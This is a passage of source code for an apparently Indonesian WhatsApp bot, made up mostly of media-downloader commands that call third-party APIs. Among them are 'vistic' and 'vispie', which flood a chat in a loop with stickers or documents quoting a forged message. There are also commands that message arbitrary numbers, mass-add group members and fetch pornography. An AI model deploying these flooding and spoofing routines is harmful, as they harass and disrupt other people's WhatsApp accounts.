                    console.log(err);
                    m.reply("Maaf, server1 sepertinya ada yang error :" + err);
                    await sleep(10000)
                    m.reply(mess.wait)
                    let yt = await scp.Yt(q)
                    bluz.sendMessage(m.chat, { video: { url: yt.url[2].url }, mimetype: 'video/mp4' }, { quoted: m })
                    await delay(5000)
                    bluz.sendImage(m.chat, yt.thumb, `⭔ Title : ${yt.meta.title}\n⭔ Durasi : ${yt.meta.duration}\n⭔ Sumber : ${yt.meta.source}\n⭔ Link Download : ${yt.url[1].url}`, m)
                    console.log(yt.url[1])
                    }
            break
        case 'ytmp3':
                    m.reply(mess.wait)
                try {
                    if (!text) return m.reply(`Masukan Link YouTube Nya\nContoh : ${prefix + command} https://youtu.be/OZbqRwLW9mA`)
                    if (!q.includes('youtu')) return m.reply(`Link Salah!!`)
                    m.reply(mess.wait)
                    let ytm = await scp.Ytd(q)
                    bluz.sendMessage(m.chat, { audio: { url: ytm.url[11].url }, mimetype: 'audio/mpeg' }, { quoted: m })
                    await delay(5000)
                    bluz.sendImage(m.chat, ytm.thumb, `✪══✪ ⊹⊱ YouTube Downloader ⊰⊹ ✪══✪ \n\n⭔ Title : ${ytm.meta.title}\n⭔ Durasi : ${ytm.meta.duration}\n⭔ Sumber : ${ytm.meta.source}\n⭔ Link Download : ${ytm.url[11].url}`, m)
                    console.log(ytm.url[10])
                } catch (err) {
                    console.log(err);
                    m.reply("Maaf, server1 sepertinya ada yang error :"+ err);
                    let ytms = await scp.Yt(q)
                    bluz.sendMessage(m.chat, { audio: { url: ytms.url[1].url }, mimetype: 'audio/mpeg' }, { quoted: m })
                    await delay(5000)
                    bluz.sendImage(m.chat, yt.thumb, `✪══✪ ⊹⊱ YouTube Downloader ⊰⊹ ✪══✪ \n\n⭔ Title : ${ytms.meta.title}\n⭔ Durasi : ${ytms.meta.duration}\n⭔ Sumber : ${ytms.meta.source}\n⭔ Link Download : ${ytms.url[11].url}`, m)
                }
            break
        case 'tt': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!text) return m.reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8LJNSV3/`)
                    if (!q.includes('tiktok')) return m.reply(`Link Invalid!! (Link Salah)`)
                    m.reply(mess.wait)
                    require('./lib/tt').Tiktok(q).then( data => {
                    bluz.sendMessage(from, { video: { url: data.nowm }}, { quoted: m })
                    })
                    }
            break
        case 'tiktokaudio': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!text) return m.reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8LJNSV3/`)
                    if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
                    m.reply(mess.wait)
                    require('./lib/tt').Tiktok(q).then( data => {
                    bluz.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
                    })
                    }
            break
        case 'ttnowm':
                    m.reply(mess.wait)
                try {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!text) return m.reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8LJNSV3/`)
                    if (!q.includes('tiktok')) return m.reply(`Link Invalid!! (Link Salah)`)
                    m.reply(mess.wait)
                    require('./lib/tt').Tiktok(q).then( data => {
                    bluz.sendMessage(from, { video: { url: data.nowm }, caption:`✪══✪ ⊹⊱ Tiktok Downloader ⊰⊹ ✪══✪ \n\n⭔ Username : ${data.author}\n⭔ Title : ${data.title}\n`}, { quoted: m })
                    })
                } catch (err) {
                    console.log(err);
                    m.reply("Maaf, Fitur ini sedang error :"+ err);
                }
            break
        case "igdl": case 'ig': case 'instagram':
                    m.reply(mess.wait)
                try {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                    if (!text) return m.reply(`Masukan Link Instagram Nya\nContoh :\n${prefix + command} linkig`)
                    if (!q.includes('insta')) return m.reply(`Link Invalid!! (Link Salah)`)
                    const instagramGetUrl = require("instagram-url-direct")
                    // const url = "https://www.instagram.com/tv/CdmYaq3LAYo/"
                    let links = await instagramGetUrl(text)
                    for (var x of links.url_list) {
                        if (x.includes('.mp4')) {
                        bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                        bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }
                    console.log(links)
                } catch (err) {
                    console.log(err);
                    m.reply("Maaf, Fitur ini sedang error :" + err);
                }
            break;
        case "fbdl": case 'fb': case 'facebook':
                    m.reply(mess.wait)
                try {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                    if (!text) return m.reply(`Masukan Link Instagram Nya\nContoh :\n${prefix + command} linkig`)
                    if (!q.includes('f')) return m.reply(`Link Invalid!! (Link Salah)`)
                    const instagramGetUrl = require("instagram-url-direct")
                    // const url = "https://www.instagram.com/tv/CdmYaq3LAYo/"
                    let links = await instagramGetUrl(text)
                    for (var x of links.url_list) {
                        if (x.includes('.mp4')) {
                        bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                        bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }
                    console.log(links)
                } catch (err) {
                    console.log(err);
                    m.reply("Maaf, Fitur ini sedang error :" + err);
                }
            break;
            //MEDSOS
            case 'fbdl2': case 'fb2': case 'facebook2': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/facebook?apikey=${zzzkey}&url=${url}`)
                    console.log(data)
                        let hasil = data.result
                    await sleep(1000)
                    await bluz.sendMessage(m.chat, { video: { url: hasil.video }, mimetype: 'video/mp4' }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Fbdl2 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Fbdl Sedang Error, Sihlakan gunakan fbdl2, Jika tidak bisa sihlakan mencoba beberapa saat lagi')
                }
                }
                break
            case 'ttnowm2': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    const more = String.fromCharCode(8206)
                    const readmore = more.repeat(4001)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${url}`)
                    console.log(data)
                    let hasil = data.result
                    if ( data.status === 200 ) {
                    await sleep(1000)
                    await bluz.sendMessage(m.chat, { video: { url: hasil.link }, caption: `*----「 Tiktok DOWNLOAD 」----*\n\n*Title :* ${hasil.title}\n*Durasi :* ${hasil.duration}\n*View :* ${hasil.statistic.play_count}\n*Like :* ${hasil.statistic.play_count}` }, { quoted: m })}
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Tiktok Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Tiktok Sedang Error, Sihlakan gunakan ttnowm2')}
            }
                break
            case 'ttnowm4' : 
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let tknowm = await api.downloader.tiktok(q)
                    console.log(tknowm)
                    bluz.sendMessage(m.chat, { video: { url: tknowm.nowm }, caption: `*----「 TIKTOK DOWNLOAD 」----*\n\n*Deskripsi :* ${tknowm.title}\n` }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Tiktok2 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Tiktok Sedang Error, Sihlakan gunakan ttnowm2')}
                break
            case 'ttnowm3': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${url}`)
                    console.log(data)
                    let hasil = data.result.url_nowm
                    await bluz.sendMessage(m.chat, { video: { url: hasil }}, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Tiktok2 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Tiktok Sedang Error, Sihlakan gunakan ttnowm, Jika tidak bisa sihlakan mencoba beberapa saat lagi')}
            }
                break
            case 'igdl2': case 'ig': case 'instagram': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                    try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=${lolkey}&url=${url}`)
                    for (var x of data.result) {
                        if (x.includes('.mp4')) {
                            bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                            bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Instagram Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Instagram Sedang Error, Sihlakan gunakan igdl2')}
                }
                break
            case 'igdl2': case 'ig2': case 'instagram2': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                    try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/instagram?apikey=${zzzkey}&url=${url}`)
                    for (var x of data.result) {
                        if (x.includes('.mp4')) {
                            bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                            bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Igdl2 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Instagram Sedang Error, Sihlakan gunakan igdl, Jika tidak bisa sihlakan mencoba beberapa saat lagi')
                }
                }
                break
                case 'igdl3': case 'ig3': case 'instagram3': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                    try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/instagram2?apikey=${lolkey}&url=${url}`)
                    for (var x of data.result.media)
                    console.log(data)
                    {
                        if (x.includes('.mp4')) {
                            bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                            bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Instagram Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur Instagram Sedang Error, Sihlakan gunakan igdl')}
                }
                break
                case 'cek': {
                    if (!text) throw `Example : ${prefix + command} clash of clans`
                    let data = await fetchJson(`https://cekrek.heirro.dev/api/check/`)
                    //let teks = `⭔ Playstore Search From : ${text}\n\n`
                    //for (let i of data.info)
                    console.log(data)
                    let hasil = data.info.parameters
                    //bluz.sendMessage(m.chat, { text: { url: hasil.url }, caption: `*----「 Tiktok DOWNLOAD 」----*\n\n*Title :* ${hasil.title}\n }, { quoted: m })
//                     await bluz.sendMessage(m.chat, { text: { url: hasil }, caption: `
// *----「 Tiktok DOWNLOAD 」----*\
// *Title :* ${hasil.descriptions}
// *Durasi :* ${hasil.duration}
// *View :* ${hasil.descriptions}
// *Like :* ${hasil.descriptions}` 
// }, { quoted: m })
m.reply(`
*Title :* ${hasil.accountBank[16]}
*Durasi :* ${hasil.accountNumber}`)
                    // {
                    // teks += `⭔ Name : ${i.name}\n`
                    // teks += `⭔ Link : ${i.link}\n`
                    // teks += `⭔ Developer : ${i.developer}\n`
                    // teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
                    // }
                    // m.reply(teks)
                    }
                    break
            case 'igs': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!text) throw 'Masukkan Query Link!'
                    m.reply('Story harus berupa video')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/instagram/story?apikey=${zzzkey}&username=${text}`)
                    for (var x of data.result.url_list) {
                        console.log(data)
                        if (x.includes('.mp4')) {
                            bluz.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
                        } else {
                            bluz.sendMessage(m.chat, { image: { url: x } })
                        }
                    }}
                break
            case 'play': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!text) throw `Example : ${prefix + command} story wa anime`
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.kirbotz.my.id/api/download/playmp4?query=${text}&apikey=KirBotz`)
                    console.log(data)
                    let hasil = data
                    bluz.sendMessage(m.chat, { image: { url: hasil.thumb }, caption: `⭔ Name Song ⭔ : ${hasil.title}\n⭔ Link YouTube ⭔ : ${hasil.channel}\n⭔ View ⭔ : ${hasil.views}` }, { quoted: m })
                    //await sleep(3000)
                    bluz.sendMessage(m.chat, { audio: { url: hasil.url }, mimetype: 'audio/mpeg' }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Ytm3 Lolhuman Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur YouTube Audio Sedang Error, Sihlakan gunakan yt3')
                }
                }
                    break
            case 'ytm3': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${lolkey}&url=${url}`)
                    console.log(data)
                    let hasil = data.result
                    bluz.sendMessage(m.chat, { audio: { url: hasil.link }, mimetype: 'audio/mpeg' }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Ytm3 Lolhuman Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur YouTube Audio Sedang Error, Sihlakan gunakan yt3')
                }
                }
                    break
            case 'yt3': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=${zzzkey}&url=${url}`)
                    console.log(data)
                    let hasil = data.result
                    bluz.sendMessage(m.chat, { audio: { url: hasil.getAudio }, mimetype: 'audio/mpeg' }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Yt3 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur YouTube Audio Sedang Error, Sihlakan gunakan ytm3, Jika tidak bisa sihlakan mencoba beberapa saat lagi')
                }
                }
                    break
            case 'ytm4': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/ytvideo?apikey=${lolkey}&url=${url}`)
                    console.log(data)
                    await sleep(1000)
                    let hasil = data.result
                    bluz.sendMessage(m.chat, { video: { url: hasil.link.link }, caption: `*----「 YouTube DOWNLOAD 」----*\n\n*Title :* ${hasil.title}\n*Durasi :* ${hasil.duration}\n*Quality :* ${hasil.link.resolution}\n*Size :* ${hasil.link.size}` }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Ytm4 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur YouTube Video Sedang Error, Sihlakan gunakan yt4')
                }
                }
                    break
            case 'yt4': {
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                try {
                    let url = args.join(' ')
                    let data = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=${zzzkey}&url=${url}`)
                    console.log(data)
                    await sleep(1000)
                    let hasil = data.result
                    bluz.sendMessage(m.chat, { video: { url: hasil.getVideo }, mimetype: 'video/mp4' }, { quoted: m })
                } catch {
                    bluz.sendMessage('6289696090800@s.whatsapp.net', {text: `Pesan Dari : @${m.sender.split("@")[0]}\nFitur Yt4 Sedang ERROR!` }, {quoted:m})
                    await sleep(1000)
                    m.reply('Fitur YouTube Video Sedang Error, Sihlakan gunakan yt4')
                }
                }
                    break
            case 'twt':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                    hxz.twitter(q).then( data => {
                    //bluz.sendMessage(from, { video: { url: data.HD }}, { quoted: m })
                    bluz.sendMessage(m.chat, { video: { url: data.HD }, caption: `*----「 TWITTER DOWNLOAD 」----*\n\n*Deskripsi :* ${data.desc}\n` }, { quoted: m })
                    console.log(data)
                    }).catch(() => m.reply(mess.error.api))
                    break
            case 'mediafire':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) throw (mess.link)
                    m.reply(mess.wait)
                    let url = args.join(' ')
                    let data = await fetchJson(`https://api.lolhuman.xyz/api/mediafire?apikey=${lolkey}&url=${url}`)
                    console.log(data)
                    let hasil = data.result
                    let flnam = `Filename : ${hasil.filename}\n`
                    let siz = `Filesize : ${hasil.filesize}`
                    bluz.sendFileUrl(m.chat, hasil.link, flnam+siz, m)
                break
            case 'zippyshare':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (args.length == 0) return m.reply(`Example: ${prefix + command} https://www51.zippyshare.com/v/5W0TOBz1/file.html`)
                    m.reply(mess.wait)
                    axios.get(`https://api.lolhuman.xyz/api/zippyshare?apikey=${lolkey}&url=${args[0]}`).then(({ data }) => {
                        var text = `File Name : ${data.result.name_file}\n`
                        text += `Size : ${data.result.size}\n`
                        text += `Date Upload : ${data.result.date_upload}\n`
                        text += `Download Url : ${data.result.download_url}`
                        m.reply(text)
                    })
                break
            //[================================< CASE PREMIUM >==========================]
            case 'getidgc':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) return m.reply(mess.group)
                m.reply (`${m.chat}`)
                break
                case 'hu':
                case prefix+'culik':
                if (!m.isGroup) return m.reply(mess.group)
                  if (args.length < 1) return m.reply('_*Masukin id grupnya tolol*_')
                  let pantek = []
                  for (let i of groupMembers) {
                      pantek.push(i.jid)
                  }
                  await bluz.groupParticipantsUpdate(m.chat, [pantek], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 // Manik.groupAdd(q, pantek)
                  break
            case 'virus': {
                if (!args.join(" ")) return m.reply(`Example :\n${prefix + command} 628xxxxxx|vistic 5`)
                const cpes = args.join(" ")
                const nony = cpes.split("|")[0];
                const pesany = cpes.split("|")[1];
                lolh = `${pesany}`
                bluz.sendMessage(nony + "@s.whatsapp.net", { text:lolh }, {quoted:m})
            }
                await m.reply("Success")
            break
            case 'vistic':{
                //if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
                num = q.split('|')[0]
                jumlah = q.split('|')[1]
                //jumlah = `${encodeURI(q)}`
                ydd = `Hallo Aku Bluz`
                for (let i = 0; i < jumlah; i++) {
                bluz.sendMessage(m.chat, {sticker: thumb},{quoted: {
                key: { 
                fromMe: false, 
                participant: `0@s.whatsapp.net`, 
                ...({ remoteJid: "" }) 
                }, 
                "message": {
                "stickerMessage": {
                "url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
                "fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
                "fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
                "mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
                "mimetype": "image/webp",
                "height": 64,
                "width": 64,
                "directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
                "fileLength": "7774",
                "mediaKeyTimestamp": "1657290167",
                "isAnimated": false,
                }
                }
                }})
                }
                await m.reply("P, Save Andi")
                }
                break
            case 'vispie':{
                    if (!isCreator) return
                    if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
                    jumlah = `${encodeURI(q)}`
                    ydd = `Hallo Aku Bluz`
                    for (let i = 0; i < jumlah; i++) {
                    bluz.sendMessage(m.chat, {document: thumb},{quoted: {
                    key: {
                    fromMe: false, 
                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
                    },
                    "message": {
                    "documentMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
                    "mimetype": "application/octet-stream",
                    "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
                    "fileLength": "64455",
                    "pageCount": 1,
                    "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
                    "fileName": `BluzBot{zalox(prefix)}`,
                    "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
                    }
                    }
                    }})
                    }
                    await m.reply("P, Save Andi")
                    }
                    break
            case 'bokep2':{
                if (!isCreator) return
                dwhee = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
